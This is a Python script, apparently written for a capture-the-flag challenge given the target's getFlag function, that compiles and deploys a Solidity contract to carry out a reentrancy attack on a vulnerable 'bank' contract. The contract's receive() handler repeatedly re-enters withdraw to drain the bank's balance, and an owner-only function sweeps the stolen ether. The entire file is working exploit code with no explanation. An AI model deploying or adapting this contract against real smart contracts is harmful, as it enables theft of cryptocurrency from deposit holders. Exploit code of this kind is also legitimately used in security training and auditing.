#!/usr/bin/env python3
import os
from web3 import Web3
from solcx import compile_source, install_solc, set_solc_version

RPC_URL = os.environ["RPC_URL"]
PRIVATE_KEY = os.environ["PRIVATE_KEY"]
BANK = Web3.to_checksum_address(os.environ["BANK"])

source = r'''
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

interface IVulnBank {
    function deposit() external payable;
    function withdraw(uint amount) external;
    function getFlag() external view returns (string memory);
}

contract Attack {
    IVulnBank public bank;
    address payable public owner;
    uint public chunk;

    constructor(address _bank) public {
        bank = IVulnBank(_bank);
        owner = msg.sender;
    }

    function attack() external payable {
        require(msg.value > 0, "send ETH");
        chunk = msg.value;
        bank.deposit{value: msg.value}();
        bank.withdraw(msg.value);
    }

    receive() external payable {
        uint bankBalance = address(bank).balance;
        if (bankBalance > 0) {
            uint amount = bankBalance < chunk ? bankBalance : chunk;
            bank.withdraw(amount);
        }
    }

    function getFlag() external view returns (string memory) {
        return bank.getFlag();
    }

    function withdrawLoot() external {
        require(msg.sender == owner, "not owner");
        owner.transfer(address(this).balance);
    }
}
'''

install_solc("0.6.12")
set_solc_version("0.6.12")

compiled = compile_source(source, output_values=["abi", "bin"])
_, contract_interface = compiled.popitem()
abi = contract_interface["abi"]
bytecode = contract_interface["bin"]

w3 = Web3(Web3.HTTPProvider(RPC_URL))
acct = w3.eth.account.from_key(PRIVATE_KEY)

Attack = w3.eth.contract(abi=abi, bytecode=bytecode)
tx = Attack.constructor(BANK).build_transaction({
    "from": acct.address,
    "nonce": w3.eth.get_transaction_count(acct.address, "pending"),
    "gas": 900000,
    "gasPrice": w3.eth.gas_price,
    "chainId": w3.eth.chain_id,
})

signed = acct.sign_transaction(tx)
txh = w3.eth.send_raw_transaction(signed.raw_transaction)
print("[+] deploy tx:", txh.hex())

receipt = w3.eth.wait_for_transaction_receipt(txh, timeout=120)
print("[+] status:", receipt.status)
print("[+] ATTACK:", receipt.contractAddress)
